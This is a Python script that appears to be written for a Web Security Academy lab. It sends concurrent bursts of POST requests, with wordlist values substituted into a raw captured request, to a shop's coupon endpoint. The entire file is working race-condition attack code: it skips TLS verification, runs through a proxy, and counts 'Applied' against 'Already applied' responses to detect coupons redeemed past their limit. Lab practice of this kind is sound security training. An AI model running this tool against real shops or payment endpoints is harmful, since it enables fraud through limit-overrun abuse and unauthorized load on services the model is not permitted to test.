#!/usr/bin/env python3
"""
burst_sender_wordlist.py

Usage example:
python3 burst_sender_wordlist.py \
  --url "https://0a710008037dc8f880d7712400010028.web-security-academy.net/cart/coupon" \
  --rawfile req.txt --wordlist words.txt --burst-size 5 --burst-count 1 --timeout 15 --proxy http://127.0.0.1:8080
"""

import argparse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter
import time
import warnings
import urllib3
import os

warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOP_BY_HOP_HEADERS = {
    "connection",
    "keep-alive",
    "proxy-authenticate",
    "proxy-authorization",
    "te",
    "trailer",
    "transfer-encoding",
    "upgrade",
    "content-length",   # let requests set correct content-length
    "host",             # requests sets Host from URL; usually better to omit
}


def read_rawfile(path):
    """
    Parse a raw HTTP request (headers + body) into (raw_request_lines, headers_dict, body_str).
    If the file contains only the body, returns ([], {}, body).
    We also keep the request-line (first line) in raw_request_lines[0] if present.
    """
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        raw = f.read()

    head = ""
    body = ""
    if "\r\n\r\n" in raw:
        head, body = raw.split("\r\n\r\n", 1)
    elif "\n\n" in raw:
        head, body = raw.split("\n\n", 1)
    else:
        # treat whole file as body
        return [], {}, raw.strip()

    lines = head.strip().splitlines()
    headers = {}
    request_lines = lines[:]  # keep whole header block incl. request-line

    # if first line looks like request line (e.g. POST /path HTTP/2), skip it when parsing headers
    if lines:
        first = lines[0].strip()
        if first.upper().startswith(("GET ", "POST ", "PUT ", "DELETE ", "PATCH ", "OPTIONS ", "HEAD ")):
            header_lines = lines[1:]
        else:
            header_lines = lines

    for line in header_lines:
        if ": " in line:
            k, v = line.split(": ", 1)
            headers[k.strip()] = v.strip()
        elif ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()
        else:
            # ignore malformed header line
            continue

    return request_lines, headers, body.strip()


def read_wordlist(path):
    if not os.path.isfile(path):
        raise FileNotFoundError(f"wordlist not found: {path}")
    words = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            w = ln.strip()
            if w:
                words.append(w)
    return words


def replace_placeholders_in_headers_and_body(parsed_headers, body, word):
    """
    Return new_headers_dict, new_body_str where every occurrence of '%s' is replaced by word.
    """
    new_headers = {}
    for k, v in parsed_headers.items():
        if "%s" in v:
            new_headers[k] = v.replace("%s", word)
        else:
            new_headers[k] = v
    new_body = body.replace("%s", word) if body else body
    return new_headers, new_body


def prepare_session_and_headers_for_run(parsed_headers_replaced):
    """
    Create a fresh requests.Session for this run and return (session, headers_to_send).
    If Cookie header exists, set session.cookies accordingly (simple parsing).
    Remove hop-by-hop headers from headers_to_send.
    """
    session = requests.Session()

    headers_to_send = {}
    for k, v in parsed_headers_replaced.items():
        kl = k.lower()
        if kl in HOP_BY_HOP_HEADERS:
            continue
        headers_to_send[k] = v

    # handle cookies: populate session.cookies from Cookie header if present
    cookie_val = parsed_headers_replaced.get("Cookie") or parsed_headers_replaced.get("cookie")
    if cookie_val:
        # parse simple cookie string: key1=val1; key2=val2
        for pair in cookie_val.split(";"):
            if "=" in pair:
                ck, cv = pair.split("=", 1)
                session.cookies.set(ck.strip(), cv.strip())

    # ensure Content-Type exists (requests will guess if absent)
    if "Content-Type" not in headers_to_send and "content-type" not in (k.lower() for k in headers_to_send):
        headers_to_send["Content-Type"] = "application/x-www-form-urlencoded"

    return session, headers_to_send


def send_one(session, url, headers, body, timeout, proxies):
    """
    Send one POST. Returns (outcome_label, status_or_error, length).
    """
    try:
        r = session.post(url, headers=headers, data=body, timeout=timeout, proxies=proxies, verify=False)
        text = r.content.decode("utf-8", errors="replace")
        low = text.lower()
        if "invalid" in low:
            outcome = "Invalid"
        elif "already applied" in low:
            outcome = "Already"
        elif "applied" in low:
            outcome = "Applied"
        else:
            outcome = "Other"
        return outcome, r.status_code, len(r.content)
    except requests.RequestException as e:
        return "Error", str(e), 0


def main():
    p = argparse.ArgumentParser(description="Burst sender with %s placeholder support and wordlist")
    p.add_argument("--url", required=True, help="Target URL (full, e.g. https://target/cart/coupon)")
    p.add_argument("--rawfile", "-r", required=True, help="Raw packet file (headers+body or just body)")
    p.add_argument("--wordlist", "-w", required=True, help="File with replacement words, one per line")
    p.add_argument("--burst-size", type=int, required=True, help="Number of concurrent requests per burst")
    p.add_argument("--burst-count", type=int, default=1, help="Number of bursts to run for each word (default 1)")
    p.add_argument("--timeout", type=float, default=15.0, help="Request timeout seconds (default 15)")
    p.add_argument("--proxy", type=str, default=None, help="Optional proxy like http://127.0.0.1:8080")
    args = p.parse_args()

    request_lines, parsed_headers, body = read_rawfile(args.rawfile)
    words = read_wordlist(args.wordlist)
    if not words:
        print("[!] wordlist is empty.")
        return

    proxies = {}
    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}

    print(f"[+] Target: {args.url}")
    print(f"[+] Words to try: {len(words)} (from {args.wordlist})")
    print(f"[+] Burst size: {args.burst_size}, Burst count per word: {args.burst_count}, timeout: {args.timeout}")
    if args.proxy:
        print(f"[+] Proxy: {args.proxy}")
    if parsed_headers:
        print(f"[+] Headers loaded from rawfile: {', '.join(parsed_headers.keys())}")

    grand_overall = Counter()
    try:
        # iterate words sequentially
        for wi, word in enumerate(words, start=1):
            print(f"\n=== [{wi}/{len(words)}] word: '{word}' ===")
            # replace %s in headers & body for this word
            headers_replaced, body_replaced = replace_placeholders_in_headers_and_body(parsed_headers, body, word)

            # prepare a fresh session for this word (so cookies don't mix)
            session, headers_to_send = prepare_session_and_headers_for_run(headers_replaced)

            # run burst-count bursts for this word
            overall = Counter()
            for bi in range(1, args.burst_count + 1):
                t0 = time.time()
                outcomes = []
                with ThreadPoolExecutor(max_workers=args.burst_size) as exe:
                    futures = [
                        exe.submit(send_one, session, args.url, headers_to_send, body_replaced, args.timeout, proxies)
                        for _ in range(args.burst_size)
                    ]
                    for fut in as_completed(futures):
                        outcome, status, length = fut.result()
                        overall.update([outcome])
                        outcomes.append((outcome, status, length))

                elapsed = time.time() - t0
                summary = Counter([o[0] for o in outcomes])
                print(f"[word {wi} burst {bi}] sent {args.burst_size} reqs in {elapsed:.2f}s; summary: " +
                      ", ".join(f"{k}:{v}" for k, v in summary.items()))

            # print per-word summary
            print(f"[word {wi}] summary: " + ", ".join(f"{k}:{v}" for k, v in overall.items()))
            grand_overall.update(overall)

    except KeyboardInterrupt:
        print("\nInterrupted by user.")

    print("\n=== GRAND SUMMARY ===")
    for k, v in grand_overall.items():
        print(f"{k}: {v}")


if __name__ == "__main__":
    main()
